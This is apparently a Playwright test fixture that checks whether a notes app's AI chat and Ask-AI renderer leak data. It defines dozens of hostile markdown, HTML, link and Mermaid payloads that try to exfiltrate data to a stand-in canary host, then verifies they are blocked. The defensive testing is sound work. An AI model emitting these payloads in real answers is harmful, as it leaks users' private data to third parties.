import { readFile } from 'node:fs/promises';
import { resolve } from 'node:path';

import { workspaceRoot } from '@nx/devkit';
import {
  expect,
  type BrowserContext,
  type Disposable,
  type Locator,
  type Page,
  type Route,
} from '@playwright/test';
import { z } from 'zod';

import { STORED_IMAGE_HOST } from '@knowtis/shared-util';

import { E2E } from '../../support/environment';
import { test as copilotTest } from './copilot.fixture';

/** A host under the reserved `.invalid` TLD: a request to it can only be the page leaking. */
export const CANARY_HOST = 'canary.invalid';

export const BENIGN_TEXT = 'Benign paragraph that must still render';
export const STORED_IMAGE_ALT = 'kept stored image';
const STORED_IMAGE_URL = `https://${STORED_IMAGE_HOST}/notes/fixture/kept.webp`;
const STORED_IMAGE_ORIGIN = `https://${STORED_IMAGE_HOST}`;
const BENIGN_LINK_URL = 'https://example.com/docs';
const BENIGN_LINK_TEXT = 'benign link';

const LINK_TARGETS = 'a, area, [data-streamdown="link"]';
const POPUP_GRACE_MS = 1_000;
const BLANK_PAGE = 'about:blank';
const FRONTEND_ORIGIN = new URL(E2E.frontend).origin;
// the app origin proxies /t/* to analytics, so a same-origin request there is
// an exfiltration channel too
const ANALYTICS_PROXY_PREFIX = '/t/';
// fetches, not images: `img-src` would stop an image probe on a page under the
// production CSP
const PROBE_URLS = [
  `https://${CANARY_HOST}/probe`,
  `${FRONTEND_ORIGIN}${ANALYTICS_PROXY_PREFIX}__canary-probe`,
];
const APP_ORIGINS = new Set(
  [E2E.frontend, E2E.apiA, E2E.apiB].map((url) => new URL(url).origin)
);
const ONE_PIXEL_PNG = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=',
  'base64'
);

function leak(vector: string): string {
  return `https://${CANARY_HOST}/${vector}?d=trip-budget`;
}

const HOSTILE_HTML = [
  `<img src="${leak('img')}" alt="chart">`,
  `<figure data-image=""><img src="${leak('figure')}" alt="chart"></figure>`,
  `<img src="${STORED_IMAGE_URL}" srcset="${leak('srcset')} 2x" alt="chart">`,
  `<picture><source srcset="${leak('picture')}"><img src="${STORED_IMAGE_URL}" alt="chart"></picture>`,
  `<picture><source srcset="${leak('picture-bare')}"><img alt="chart"></picture>`,
  `<p style="background-image:url(${leak('style-attr')})">styled</p>`,
  `<style>@import url(${leak('import')}); p { background: url(${leak('style-el')}) }</style>`,
  `<link rel="prefetch" href="${leak('prefetch')}">`,
  `<link rel="stylesheet" href="${leak('stylesheet')}">`,
  `<iframe src="${leak('iframe')}"></iframe>`,
  `<object data="${leak('object')}"></object>`,
  `<embed src="${leak('embed')}">`,
  `<meta http-equiv="refresh" content="0;url=${leak('refresh')}">`,
  `<svg><image href="${leak('svg-image')}" /></svg>`,
  `<svg><use href="${leak('svg-use')}#a" /></svg>`,
  `<video poster="${leak('poster')}"><source src="${leak('video-src')}"></video>`,
  `<input type="image" src="${leak('input')}" alt="go">`,
  `<table background="${leak('table')}"><tr><td>cell</td></tr></table>`,
  `<svg onload="new Image().src='${leak('onload')}'"></svg>`,
  `<details open ontoggle="new Image().src='${leak('ontoggle')}'"><summary>more</summary></details>`,
  '<img src="/t/e/?d=trip-budget" alt="chart">',
];

const MARKDOWN_IMAGES = [
  `![chart](${leak('md-image')})`,
  `![chart][budget]\n\n[budget]: ${leak('md-reference')}`,
  `![chart](//${CANARY_HOST}/protocol-relative.png)`,
  '![chart](/t/e/?d=trip-budget)',
  `![chart](https://${STORED_IMAGE_HOST}@${CANARY_HOST}/userinfo.webp)`,
];

const HOSTILE_LINKS_HTML = [
  `<a href="${leak('link')}">external link</a>`,
  `<a href="${leak('link-blank')}" target="_blank">new tab link</a>`,
  `<a href="javascript:fetch('${leak('js')}')">script link</a>`,
  `<svg><a href="${leak('svg-link')}"><text>svg link</text></a></svg>`,
  `<form action="${leak('form')}"><button>Continue</button></form>`,
];

/** Links the chat keeps as links: each must open nothing on a plain click. */
const HOSTILE_LINKS_MARKDOWN = [
  `[markdown link](${leak('md-link')})`,
  `[script link](javascript:fetch('${leak('js-md')}'))`,
  `<${leak('autolink')}>`,
  `[reference link][docs]\n\n[docs]: ${leak('md-ref-link')}`,
];

/** A link whose scheme the chat's sanitizer allows but `hardenAssistantUrl` empties. */
export const SCHEME_STRIPPED_LINK_TEXT = 'chat link';
const SCHEME_STRIPPED_LINK = `[${SCHEME_STRIPPED_LINK_TEXT}](irc://${CANARY_HOST}/channel)`;

/** Diagrams whose loads Mermaid's label sanitizer, `secure` keys or strict mode stop before drawing. */
const HOSTILE_MERMAID = [
  `flowchart TD\n  A["<img src=${leak('mermaid-label')}>"] --> B`,
  `flowchart TD\n  A["<span style='background-image:url(${leak('mermaid-span')})'>x</span>"] --> B`,
  `%%{init: {"themeCSS": "div { background-image: url(${leak('mermaid-theme')}) }"}}%%\nflowchart TD\n  A --> B`,
  `flowchart TD\n  A --> B\n  click A href "${leak('mermaid-click')}" _blank`,
];

/** Diagrams Mermaid fetches from while it draws, before any app layer runs. */
const DRAW_TIME_MERMAID = [
  `stateDiagram-v2\n  classDef bad background:url(${leak('mermaid-classdef')})\n  [*] --> A\n  class A bad`,
  `classDiagram\n  class A\n  style A fill:url(${leak('mermaid-style')})`,
  `flowchart TD\n  A@{ img: "${leak('mermaid-img-shape')}", label: "L", pos: "t", h: 60, constraint: "on" }`,
];

const ATTRIBUTE_ESCAPES: Readonly<Record<string, string>> = {
  '&': '&amp;',
  '"': '&quot;',
  '<': '&lt;',
  '>': '&gt;',
};

function mermaidBlockHtml(source: string): string {
  const code = source.replace(
    /[&"<>]/g,
    (char) => ATTRIBUTE_ESCAPES[char] ?? char
  );
  return `<div data-mermaid-block="" data-code="${code}"></div>`;
}

function fence(source: string): string {
  return `\`\`\`mermaid\n${source}\n\`\`\``;
}

/** A chat answer or Ask-AI completion carrying every hostile image, embed, link and diagram markdown can hold. */
export const HOSTILE_MARKDOWN = [
  BENIGN_TEXT,
  `![${STORED_IMAGE_ALT}](${STORED_IMAGE_URL})`,
  `[${BENIGN_LINK_TEXT}](${BENIGN_LINK_URL})`,
  ...MARKDOWN_IMAGES,
  ...HOSTILE_HTML,
  ...HOSTILE_LINKS_MARKDOWN,
  ...HOSTILE_LINKS_HTML,
  ...[...HOSTILE_MERMAID, ...DRAW_TIME_MERMAID].map(fence),
].join('\n\n');

/** The chat answer holding the one link the chat renders as a bare same-page anchor. */
export const SCHEME_STRIPPED_ANSWER = [BENIGN_TEXT, SCHEME_STRIPPED_LINK].join(
  '\n\n'
);

/** A proposed note body carrying every hostile image, embed, link and diagram that loads nothing before drawing. */
export const HOSTILE_PROPOSAL_HTML = [
  `<p>${BENIGN_TEXT}</p>`,
  `<figure data-image=""><img src="${STORED_IMAGE_URL}" alt="${STORED_IMAGE_ALT}"></figure>`,
  `<p><a href="${BENIGN_LINK_URL}">${BENIGN_LINK_TEXT}</a></p>`,
  ...HOSTILE_HTML,
  ...HOSTILE_LINKS_HTML,
  ...HOSTILE_MERMAID.map(mermaidBlockHtml),
].join('');

export const HOSTILE_MERMAID_COUNT = HOSTILE_MERMAID.length;

/** A proposed note body whose diagrams fetch while Mermaid draws them. */
export const DRAW_TIME_PROPOSAL_HTML = [
  `<p>${BENIGN_TEXT}</p>`,
  ...DRAW_TIME_MERMAID.map(mermaidBlockHtml),
].join('');

interface ForeignRequests {
  /** Every request a page of the context sent outside the app or into its analytics proxy, in order. Blob-store images are answered locally and left out. */
  readonly urls: readonly string[];
  /** Makes `page` request the canary host and then the analytics proxy, waiting until each is recorded, so an empty record means nothing left, not that nothing was watched. */
  probe(page: Page): Promise<void>;
  /** The record expected once the probes went out and nothing else did. */
  readonly probeOnly: readonly string[];
}

async function recordForeignRequests(context: BrowserContext) {
  const urls: string[] = [];
  const isWatched = (url: URL) =>
    !APP_ORIGINS.has(url.origin) ||
    (url.origin === FRONTEND_ORIGIN &&
      url.pathname.startsWith(ANALYTICS_PROXY_PREFIX));
  const handler = async (route: Route) => {
    const url = route.request().url();
    if (new URL(url).origin === STORED_IMAGE_ORIGIN) {
      await route.fulfill({ contentType: 'image/png', body: ONE_PIXEL_PNG });
      return;
    }
    urls.push(url);
    await route.abort('blockedbyclient');
  };
  await context.route(isWatched, handler);

  const recorder: ForeignRequests = {
    urls,
    probeOnly: PROBE_URLS,
    async probe(page) {
      for (const probeUrl of PROBE_URLS) {
        await page.evaluate((url) => {
          fetch(url, { mode: 'no-cors' }).catch(() => undefined);
        }, probeUrl);
        await expect.poll(() => urls.includes(probeUrl)).toBe(true);
      }
    },
  };
  return {
    recorder,
    release: () => context.unroute(isWatched, handler),
  };
}

export const test = copilotTest.extend<{ foreignRequests: ForeignRequests }>({
  foreignRequests: async ({ sharing }, use) => {
    const { recorder, release } = await recordForeignRequests(
      sharing.owner.context
    );
    try {
      await use(recorder);
    } finally {
      await release();
    }
  },
});

const headerSchema = z.object({ key: z.string(), value: z.string() });
const vercelSchema = z.object({
  headers: z.array(z.object({ headers: z.array(headerSchema) })),
});
const ENFORCED_CSP_HEADER = 'Content-Security-Policy';
const IMG_SRC_DIRECTIVE = 'img-src';

/** The `img-src` directive the notes app enforces in production, read from `vercel.json`. */
export async function productionImgSrc(): Promise<string> {
  const config = vercelSchema.parse(
    JSON.parse(await readFile(resolve(workspaceRoot, 'vercel.json'), 'utf8'))
  );
  const policy = config.headers
    .flatMap(({ headers }) => headers)
    .find(({ key }) => key === ENFORCED_CSP_HEADER)?.value;
  const directive = policy
    ?.split(';')
    .map((part) => part.trim())
    .find((part) => part.startsWith(`${IMG_SRC_DIRECTIVE} `));
  if (!directive) {
    throw new Error(`vercel.json enforces no ${IMG_SRC_DIRECTIVE}`);
  }
  return directive;
}

/**
 * Enforces `policy` on every document `page` loads from now on, until the
 * returned handle is disposed.
 */
export function enforceCsp(page: Page, policy: string): Promise<Disposable> {
  // a document Playwright fulfills can no longer reach the loopback API (its
  // requests fail with net::ERR_FAILED), so the policy arrives as a <meta>
  // the document carries instead of as a response header
  return page.addInitScript((content) => {
    const install = () => {
      const meta = document.createElement('meta');
      meta.httpEquiv = 'Content-Security-Policy';
      meta.content = content;
      document.head.prepend(meta);
    };
    if (document.head) {
      install();
      return;
    }
    new MutationObserver((_, observer) => {
      if (document.head) {
        observer.disconnect();
        install();
      }
    }).observe(document, { childList: true, subtree: true });
  }, policy);
}

/** Starts collecting the CSP violations `page` reports; the returned function reads them. */
export async function watchCspViolations(
  page: Page
): Promise<() => Promise<string[]>> {
  const key = `canaryCspViolations${Date.now()}`;
  await page.evaluate((storeKey) => {
    const violations: string[] = [];
    document.addEventListener('securitypolicyviolation', (event) => {
      violations.push(`${event.effectiveDirective} ${event.blockedURI}`);
    });
    Reflect.set(window, storeKey, violations);
  }, key);
  return () =>
    page.evaluate((storeKey) => {
      const violations: unknown = Reflect.get(window, storeKey);
      return Array.isArray(violations) ? violations.map(String) : [];
    }, key);
}

interface LinkClicks {
  /** Link-like elements clicked. */
  readonly clicked: number;
  /** Each tab a click opened and each navigation of the page, with the element that caused it. */
  readonly navigations: readonly string[];
}

async function clickOpening(
  page: Page,
  click: () => Promise<void>
): Promise<string | null> {
  const opened = page
    .context()
    .waitForEvent('page', { timeout: POPUP_GRACE_MS })
    .catch(() => null);
  await click();
  const popup = await opened;
  if (!popup) {
    return null;
  }
  await popup
    .waitForURL((url) => url.href !== BLANK_PAGE, {
      waitUntil: 'commit',
      timeout: POPUP_GRACE_MS,
    })
    .catch(() => undefined);
  const url = popup.url();
  await popup.close();
  return url;
}

/**
 * Clicks, then middle-clicks, every visible link-like element of `region`,
 * dismissing the confirmation a Streamdown link opens, and reports every tab
 * a click opened and every navigation of the page.
 */
export async function clickEveryLink(
  page: Page,
  region: Locator
): Promise<LinkClicks> {
  const startUrl = page.url();
  const dialog = page.getByRole('dialog');
  const navigations: string[] = [];
  let clicked = 0;
  for (const target of await region.locator(LINK_TARGETS).all()) {
    if (!(await target.isVisible())) {
      continue;
    }
    const element = await target.evaluate((node) =>
      node.outerHTML.slice(0, node.outerHTML.indexOf('>') + 1)
    );
    const confirmsFirst = await target.evaluate(
      (node) => node.localName === 'button'
    );
    const clicks = confirmsFirst
      ? [() => target.click()]
      : [() => target.click(), () => target.click({ button: 'middle' })];
    for (const click of clicks) {
      const opened = await clickOpening(page, click);
      if (opened !== null) {
        navigations.push(`${element} opened ${opened}`);
      }
    }
    if (confirmsFirst) {
      await expect(dialog).toBeVisible();
      await page.keyboard.press('Escape');
      await expect(dialog).toHaveCount(0);
    }
    if (page.url() !== startUrl) {
      navigations.push(`${element} navigated to ${page.url()}`);
    }
    clicked += 1;
  }
  return { clicked, navigations };
}
